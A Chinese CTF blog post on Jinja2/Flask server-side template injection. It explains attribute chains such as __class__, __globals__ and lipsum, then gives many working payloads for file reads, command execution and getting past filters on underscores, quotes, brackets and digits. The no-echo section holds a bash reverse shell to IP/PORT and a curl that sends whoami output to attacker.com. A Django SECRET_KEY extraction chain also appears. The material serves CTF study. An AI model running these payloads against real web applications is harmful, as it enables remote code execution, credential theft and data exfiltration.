---
title: SSTI-Python
author: Creexile
date: 2026-06-22
lastMod: 2026-06-22
summary: ''
cover: ''
category: 'CTF'
draft: false
comments: false
sticky: 0
tags: [CTF, CTF知识, SSTI, Python, RCE, 爆破, Flask]
---

Jinja2是一种面向Python的现代和设计友好的模板语言, 它以Django的模板为模型, 是Flask框架的一部分. Jinja2会把模板参数提供的相应的值替换为`{{ }}`块

Jinja2使用{{name}}结构表示一个变量, 它是一种特殊的占位符, 告诉模版引擎这个位置的值从渲染模版时使用的数据中获取. 它同样支持控制语句, 像在`{% %}`块中

```python
<ul>
     {% for comment in comments %}
         <li>{{comment}}</li>
     {% endfor %}
</ul>
```

另外Jinja2能识别所有类型的变量, 甚至是一些复杂的类型, 例如列表、字典和对象. 此外, 还可使用过滤器修改变量, 过滤器名添加在变量名之后, 中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值

```python
{{name|capitalize}}
```

由于在jinja2中是可以直接访问python的一些对象及其方法的, 所以可以通过构造继承链来执行一些操作, 比如文件读取, 命令执行等

```python
__dict__　　 # 保存类实例或对象实例的属性变量键值对字典
__class__　　# 返回一个实例所属的类
__mro__　　  # 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析
__bases__　　# 以元组形式返回一个类直接所继承的类（可以理解为直接父类）
__base__　　 # 和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组
# __base__和__mro__都是用来寻找基类的
__subclasses__　　# 以列表返回类的子类
__init__　　 # 类的初始化方法
__globals__　　   # 对包含函数全局变量的字典的引用__builtin__&&__builtins__　　# python中可以直接运行一些函数，例如int(), list()等等, 这些函数可以在__builtin__可以查到. 查看的方法是dir(__builtins__). 在py3中__builtin__被换成了builtin.
```

1. 在主模块main中, `__builtins__`是对内建模块`__builtin__`本身的引用, 即`__builtins__`完全等价于`__builtin__`.
2. 非主模块main中，`__builtins__`仅是对`__builtin__.__dict__`的引用, 而非`__builtin__`本身.

## 判断漏洞

```python
# 如果输出49则证明有漏洞
{{7*7}}
```

> 如果if的条件正确, 就会输出result, 否则输出空
> 观察页面是否输出yes, 如果输出yes, 则代表有漏洞, 其中, 语句中的a默认是false, 前面加一个not就是true

## 构造字符获取payload步骤

做题你会发现payload基本上只有最后的一把梭, 怎么构造的却不知道

### 示例1

这里环境为python2, 可以直接通过构造继承链利用file对象读取文件

```python
for c in {}.__class__.__base__.__subclasses__():
    if(c.__name__=='file'):
        print(c)
        print c('joker.txt').readlines()
```

上述代码先通过`__class__`获取字典对象所属的类，再通过`__base__`（`__bases[0]__`）拿到基类，然后使用`__subclasses__()`获取子类列表，在子类列表中直接寻找可以利用的类

这个链如此构造,首先打印子类列表:

```python
for c in {}.__class__.__base__.__subclasses__():
        print(c)
# file子类在第41个, 但是计数从0开始
```

然后利用dir查看file这个子类的内置方法,找到readline

```python
dir(().__class__.__bases__[0].__subclasses__()[40])
```

后面就是if语句进行选择即可;后面就是jinja2的语法封装

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__=='file' %}
{{ c("/etc/passwd").readlines() }}
{% endif %}
{% endfor %}
```

### 示例2

先确定payload

```python
(lipsum|attr("__globals__").get("os").popen("cat /flag").read()
```

如果数字被过滤, 获取数字

获得`__globals__`
-> 从`lipsum|string|list`中获取下划线
-> 使用`pop()`方法, `pop`方法可以根据索引值来删除列中的某个元素并将该元素返回值返回

获取`os`模块
-> 使用`get`方法

获取`popen`方法
-> 获取`popen`字段

获取flag
-> 获得`chr`函数, 通过`chr`函数来获得命令的每个字符
-> 获取`__builtins__`, 通过`(lipsum|attr("__globals__")).get("__builtins__").get("chr")`
-> 获取`read`, 执行shell命令

还是站在了前人的肩膀上, 真要了解要去翻源码了

#### 获取 pop

```python
# 显示 pop 成功
{%set pop=dict(pop=a)|join%}
{%print pop%}
```

#### 查看 string 表

```python
# _ 会在第 24 个
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)%}{%print xiahuaxian%}
```

#### 利用 pop 获取下划线

```python
# 显示 _ 成功
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}{%print xiahuaxian%}
```

#### 获取\_\_globals\_\_

```python
# 显示 __globals__ 成功
{%set pop=dict(pop=a)|join%}{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%print globals%}
```

#### 获取 get

```python
# 显示 get 成功
{%set get=dict(get=a)|join%}
{%print get%}
```

#### 获取os模块

```python
# 显示 <module 'os' from '/usr/local/lib/python3.8/os.py'> 成功
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set shell=dict(o=a,s=b)|join%}
{%print (lipsum|attr(globals))|attr(get)(shell)%}
```

#### 获取popen字段

```python
# 显示 popen 成功
{%set popen=dict(popen=a)|join%}
{%print popen%}
```

#### 获取popen方法

```python
# 返回 <function popen at 0x...> 成功
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set shell=dict(o=a,s=b)|join%}
{%set popen=dict(popen=a)|join%}
{%print (lipsum|attr(globals))|attr(get)(shell)|attr(popen)%}
```

#### 获取\_\_builtins\_\_

```python
# 返回 __builtins__ 成功
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%print builtins%}
```

#### 获取 chr 函数

```python
# 返回 <built-in function chr> 成功
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%}
{%print char%}
```

#### 拼接 shell 命令

```python
# 返回 cat /flag 成功(此处执行命令为 cat /flag)
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%}
{%set command=char(99)+char(97)+char(116)+char(32)+char(47)+char(102)+char(108)+char(97)+char(103)%}
{%print command%}
```

#### 获取read

```python
# 返回 read 成功
{%set read=dict(read=a)|join%}
{%print read%}
```

#### 执行shell(payload)

```python
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set shell=dict(o=a,s=b)|join%}
{%set popen=dict(popen=a)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%}
{%set command=char(99)+char(97)+char(116)+char(32)+char(47)+char(102)+char(108)+char(97)+char(103)%}
{%set read=dict(read=a)|join%}{%print (lipsum|attr(globals))|attr(get)(shell)|attr(popen)(command)|attr(read)()%}
```

## 构造字符

各种奇妙知识

#### 获取数字

先测试是否数字被过滤,如无过滤跳过这一步

```
?name={%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%print (one,two,three,four,five,six,seven,eight,nine)%}
```

![image-20240310155927535](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240310155927535.png)

### 过滤器 ()|select|string

`()|select|string`得到的结果是: `<generator object select_or_reject at 0x十六进制数字>`; 你看, 有下划线有字母, 那肯定可以构造啊

```python
{{(()|select|string)[24]~
(()|select|string)[24]~
(()|select|string)[15]~
(()|select|string)[20]~
(()|select|string)[6]~
(()|select|string)[18]~
(()|select|string)[18]~
(()|select|string)[24]~
(()|select|string)[24]}} = "__classs__"
```

如果过滤了中括号，还可以使用`foobar|select|string|list`转换为列表后，使用`pop`或者`__getitem__`来取值

### dict(clas=a,s=b)|join

使用`dict(cla=a,s=b)|join`后，得到的是字符串”class”

```python
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(24)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
#("_","_","init","_","_")|join()  实际上使用可以不用join后面的括号
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
{%print(x.open(file).read())%}
```

### dict(e=a)|join|count

当过滤数字的时候，我们可以用这种方法得到数字

```python
dict(e=a)|join|count #1
dict(ee=a)|join|count #2
```

## 过滤

过滤

```
// 双花括号被过滤, 用{%%}
{%print 123%}

// 数字被过滤, 通过if条件来判断: {%if 条件%}result{%endif%}
{%if not a%}yes{%endif%}
// 数字被过滤, 构造payload先获取数字然后将数字变为乘法运算
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}

// 部分关键词被过滤, 例如:
{%set popen=dict(popen=a)|join%}
// 换成
{%set pp=dict(po=a,pen=b)|join%}
```

### 过滤点

可以通过中括号获取属性

```python
''.__class__ = ''['__class__']
```

### 过滤中括号

如果同时过滤了点, 用`|attr`过滤器

```python
''.__class__ = ''|attr('__class__')
```

#### 魔法方法

还可以用魔法方法: `__getattribute__`来获取属性，`__getitem__`来获取字典中的键值

```python
''.__class__ = ''.__getattribute__('__class__')
url_for.__globals__['__builtins__'] == url_for.__globals__.__getitem__('__builtins__')
#__globals__返回的是字典, 另外__builtins__也是
```

#### url_for

`url_for`是Flask中一个特殊的方法, 模板注入中可用于命令执行

```python
{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
#类似的还有
get_flashed_messages.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")

lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")
# 另外还有，lipsum.__globals__含有os模块：
{{lipsum.__globals__['os'].popen('ls').read()}}
# 别人发现的
{{get_flashed_messages.__globals__['os'].popen('dir').read()}}
{{url_for.__globals__['os'].popen('dir').read()}}
```

#### config

`{{config}}`所有设置，也可以用于获得其他东西

```python
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}

{{ config.__class__.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('dir').read()")}}
```

实际上，对于任何`.__init__`不带`wrapper`的都可以调用到`__globals__`，而在flask中，未定义的也不带，所以有如下payload

```python
foobar.__class__.__init__.__globals__['__builtins__']
# 这里面有个opne函数，open("filename").read可以直接读取文件
# foobar.__class__.__init__显示的是：<function Undefined.__init__ at 0x03275658>
```

#### 字典

```python
# 删除某个键值,返回值是改键值，可能删除掉东西
url_for.__globals__.pop('__builtins__')
# 得到某个键值，这个好用
url_for.__globals__.get('__builtins__')
# 和get类似
url_for.__globals__.setdefault('__builtins__')
```

Python可以直接用点操作符拼接

```python
{{url_for.__globals__.__builtins__}}
```

对于中括号最常用的数组取值的功能, 我们可以利用`__getitem__`替代:

```python
''.__class__.__mro__[-1] == ''.__class__.__mro__.__getitem__(-1)
```

### 过滤关键字

#### 拼接

```python
# 或者使用过滤器 ('__clas','s__')|join
''.__class__ = ''['__cla' + 'ss__']
# 去掉也行
''.__class__ = ''['__cla''ss__']
# ~号拼接
''.__class__ = ''['__cla'~'ss__']
{%set a='__cla' %}{%set b='ss__'%}{{""[a~b]}}

{{().__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['o'+'s'].popen('l'+'s').read()}}
```

#### 转置

```python
# 或者使用过滤器 "__ssalc__"|reverse
''.__class__ = ''['__ssalc__'[::-1]]
```

#### 利用str内置方法

```python
# 字符串的替换，还可以使用过滤器 "__claee__"|replace("ee","ss")
''['__CLASS__'.lower()]
''.__class__ == ""['__cTass__'.replace("T","l")] ==
''['X19jbGFzc19f'.decode('base64')]
# 似乎是python3的原因:'str object' has no attribute 'decode'
```

#### 编码绕过

```python
# 字符串格式化
''.__class__ = ''["{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}".format(95,95,99,108,97,115,115,95,95)]
# 或者使用过滤器  ""["%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)]

# 十六进制的字符绕过
''.__class__ = ''["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]

# chr函数转换, 但是需要寻找chr函数
{% set chr=url_for.__globals__['__builtins__'].chr %}
# {%set chr = x.__init__.__globals__['__builtins__'].chr%}
{{""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}

{{().__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['os'].popen('cat /etc/passwd'.encode('rot13')).read()|rot13}}
```

#### 属性链遍历

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}
```

### request绕过

值得拿出来溜溜

```python
# 新开一个路, 这条路不就没有之前那么多限制了吗
request              # request.__init__.__globals__['__builtins__']
request.args.x1   	 # get传参
request.values.x1 	 # 所有参数
request.cookies      # cookies参数
request.headers      # 请求头参数
request.form.x1   	 # post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 # post传参	(Content-Type:a/b)
request.json		 # post传json  (Content-Type: application/json)
```

给个例子

```python
{{x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)}}
# 然后首部设置Cookie:x1=__builtins__;x2=__import__('os').popen('cat /flag').read()

{{""[request["args"]["class"]][request["args"]["mro"]][1][request["args"]["subclass"]]()[286][request["args"]["init"]][request["args"]["globals"]]["os"]["popen"]("ls /")["read"]()}}
# post或者get传参 class=__class__&mro=__mro__&subclass=__subclasses__&init=__init__&globals=__globals__ (适用于过滤下划线)
```

xyctf 2025 题目 Now you see me 1

使用`request.endpoint`获取到当前路由的函数名, 通过切片获取字符, 然后构造`request.data`, 再在请求体中传入任意字符进行绕过, 最终获得任意字符

### 过滤单/双引号

用`request`或者`chr()`方法

```python
# request
{{config.__class__.__init__.__globals__[request.args.os].popen(request.args.command).read()}}&os=os&command=cat /flag

# chr(): __globals__['os']['popen']('ls').read()
{%set chr = x.__init__.__globals__.get(__builtins__).chr%}
{{x.__init__.__globals__[chr(111)%2bchr(115)][chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(108)%2bchr(115)).read()}}
```

### 过滤双花括号

据我所知, 应该还有几种括号可以用, 比如`{% ... %}`

```python
{%print(x|attr(request.cookies.init)|attr(request.cookies.globals)|attr(request.cookie.getitem)|attr(request.cookies.builtins)|attr(request.cookies.getitem)(request.cookies.eval)(request.cookies.command))%}
# cookie: init=__init__;globals=__globals__;getitem=__getitem__;builtins=__builtins__;eval=eval;command=__import__("os").popen("cat /flag").read()

{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://ip:8080/?i=ls /').read()=='p' %}1{% endif %}
# python2 没测试过
```

### 过滤小括号

没见过

### 无回显

```python
# 反弹shell
{{().__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"')}}

# DNS外带
{{().__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['os'].popen('curl http://attacker.com/`whoami`')}}
```

## 其他方式

[Fenjing一把梭](https://github.com/Marven11/Fenjing)

### lipsum链

`lipsum` 是 Jinja2 模板引擎中的一个全局函数。它是 Flask/Jinja2 中一个常用的内置函数，主要用于生成占位文本（Lorem Ipsum）

正常用法如下:

```jinja2
{# 在正常模板中使用 #}
{{ lipsum() }}  {# 生成随机 Lorem Ipsum 文本 #}
{{ lipsum(3) }} {# 生成3段文本 #}
```

而能在ssti中利用`lipsum`的原因, 它是一个**函数对象**，具有 `__globals__` 属性，可以用于访问 Python 内置模块, 而且Flask应用**默认启用**

```jinja2
{# 基本利用链 #}
{{ lipsum.__globals__ }}
{{ lipsum.__globals__.os }}
{{ lipsum.__globals__.__builtins__ }}

{# 完整命令执行链 #}
{{ lipsum.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ lipsum.__globals__.__builtins__.__import__('os').system('whoami') }}
{# 如果global中已经有os了就直接用 #}
{{ lipsum.__globals__.__getitem__('os').popen('id').read() }}
{{ lipsum.__globals__.get('os').popen('id').read() }}
```

> 因为`__globals__`返回的是字典，所以可以使用get来获取值而不用`__getitem__`

`lipsum`的好处是它可以使用attr过滤器来绕过`.`和`[]`被过滤的情况

```jinja2
{{ lipsum|attr("__globals__")|attr("__builtins__")|attr("__import__")("os")|attr("popen")("id")|attr("read")() }}
```

结合编码可以绕过大多数的waf, 比如这个:

```jinja2
{# {{ lipsum.__globals__.get('os').popen('ls').read() }} #}
{%print(lipsum|attr("%c%c%c%c%c%c%c%c%c%c%c"%(95,95,103,108,111,98,97,108,115,95,95))|attr("%c%c%c"%(103,101,116))("os"))|attr("%c%c%c%c%c"%(112,111,112,101,110))("ls")|attr("%c%c%c%c"%(114,101,97,100))()%}
```

还有其他类似的Flask/Jinja2全局对象, 比如dict对象, range函数, cycler函数, joiner函数, namespace函数, 他们都有`__init__.__globals__.__builtins__`, 都可以试试

```jinja2
{{ dict.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ dict.__base__.__subclasses__()[X].__init__.__globals__['os'].popen('ls').read() }}
```

### trnado

tornado render是python中的一个渲染函数, 也就是一种模板. 通过调用的参数不同, 生成不同的网页, 如果用户对render内容可控, 不仅可以注入XSS代码, 而且还可以通过`{{ }}`进行传递变量和执行简单的表达式

### Django

可以通过某种方式, 找到Django默认应用admin的model, 再通过这个model获取settings对象, 进而获取数据库账号密码、Web加密密钥等信息

```python
{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}
{user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}
```

参考文章

1. [aliyun-flask之ssti模版注入从零到入门](https://xz.aliyun.com/t/3679)
2. [个人博客-SSTI进阶](https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/)
3. [csdn-超详细SSTI模板注入漏洞原理讲解](https://blog.csdn.net/qq_61955196/article/details/132237648)
4. [python SSTI tornado render模板注入](https://www.cnblogs.com/cimuhuashuimu/p/11544455.html)
